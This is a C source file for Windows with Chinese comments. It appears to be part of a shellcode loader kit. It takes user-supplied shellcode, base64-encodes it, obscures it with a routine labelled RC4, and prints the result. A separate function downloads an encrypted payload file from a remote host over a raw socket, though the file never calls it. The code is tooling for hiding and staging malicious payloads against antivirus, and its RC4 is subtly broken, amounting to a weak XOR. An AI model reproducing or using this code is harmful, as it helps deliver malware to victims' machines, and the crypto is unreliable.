#include <Windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")

unsigned char key[] = ""; /*use md5(key)*/
unsigned char buf[] = ""; /*your shellcode here*/
int len = 0;              /*lenth of your shellcode*/

unsigned char* base64_encode(unsigned char* str, int str_len)
{
    long len;
    unsigned char* res;
    int i, j;
    //定义base64编码表  
    unsigned char* base64_table = (unsigned char*)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    //计算经过base64编码后的字符串长度  
    if (str_len % 3 == 0)
        len = str_len / 3 * 4;
    else
        len = (str_len / 3 + 1) * 4;

    res = (unsigned char*)malloc(sizeof(unsigned char) * len + 1);
    res[len] = '\0';

    //以3个8位字符为一组进行编码  
    for (i = 0, j = 0; i < len - 2; j += 3, i += 4)
    {
        res[i] = base64_table[str[j] >> 2]; //取出第一个字符的前6位并找出对应的结果字符  
        res[i + 1] = base64_table[(str[j] & 0x3) << 4 | (str[j + 1] >> 4)]; //将第一个字符的后位与第二个字符的前4位进行组合并找到对应的结果字符  
        res[i + 2] = base64_table[(str[j + 1] & 0xf) << 2 | (str[j + 2] >> 6)]; //将第二个字符的后4位与第三个字符的前2位组合并找出对应的结果字符  
        res[i + 3] = base64_table[str[j + 2] & 0x3f]; //取出第三个字符的后6位并找出结果字符  
    }

    switch (str_len % 3)
    {
    case 1:
        res[i - 2] = '=';
        res[i - 1] = '=';
        break;
    case 2:
        res[i - 1] = '=';
        break;
    }

    return res;
}

char* GetCode(const char* host)
{
    WSADATA data;
    int err = WSAStartup(MAKEWORD(2, 2), &data);

    LPSTR ipstr = (char*)host;

    //Socket封装
    struct sockaddr_in si;
    si.sin_family = AF_INET;
    si.sin_port = htons(80);
    si.sin_addr.S_un.S_addr = inet_addr(ipstr);
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    connect(sock, (SOCKADDR*)&si, sizeof(si));
    if (sock == -1 || sock == -2)
        return 0;

    //发送请求
    char request[1024] = "GET /RC4Payload32.txt HTTP/1.1\r\nHost:";
    strcat_s(request, host);
    strcat_s(request, "\r\nConnection:Close\r\n\r\n");
    int ret = send(sock, request, strlen(request), 0);
    const int bufsize = 4096;
    char* buf = (char*)calloc(bufsize, 1);
    ret = recv(sock, buf, bufsize - 1, 0);
    while (TRUE) {
        if (*buf == '\x0d' && *(buf + 1) == '\x0a' && *(buf + 2) == '\x0d' && *(buf + 3) == '\x0a')
            break;
        else
            buf++;
    }
    buf += 4;
    closesocket(sock);
    WSACleanup();
    return buf;
}

//-----------------------RC4---------------------------------//
void swap(unsigned char* s1, unsigned char* s2)
{
    char temp;
    temp = *s1;
    *s1 = *s2;
    *s2 = temp;
}
void re_S(unsigned char* S)
{
    int i;
    for (i = 0; i < 256; i++)
        S[i] = i;
}
void re_T(unsigned char* T, unsigned char* key)
{
    int i;
    int keylen;
    keylen = strlen((const char*)key);
    for (i = 0; i < 256; i++)
        T[i] = key[i % keylen];
}
void re_Sbox(unsigned char* S, unsigned char* T)
{
    int i;
    int j = 0;
    for (i = 0; i < 256; i++)
    {
        j = (j + S[i] + T[i]) % 256;
        swap(&S[i], &S[j]);
    }
}

void RC4(unsigned char* text, unsigned char* key, int txtlen)
{
    unsigned char S[256] = { 0 };
    int i, k;
    unsigned char T[256] = { 0 };
    re_S(S);
    re_T(T, key);
    re_Sbox(S, T);
    i = k = 0;
    while (k < txtlen)
    {
        text[k] = text[k] ^ S[i];
        i = (i + 1) % 256;
        k++;
    }
}
//-----------------------RC4---------------------------------//

int main() {
    unsigned char* tmp = buf;
    tmp = base64_encode(tmp, len);
    len = strlen((const char *)tmp);
    RC4(tmp, key, len);
    printf("%s\n\n", base64_encode(tmp, len));
    return 0;
}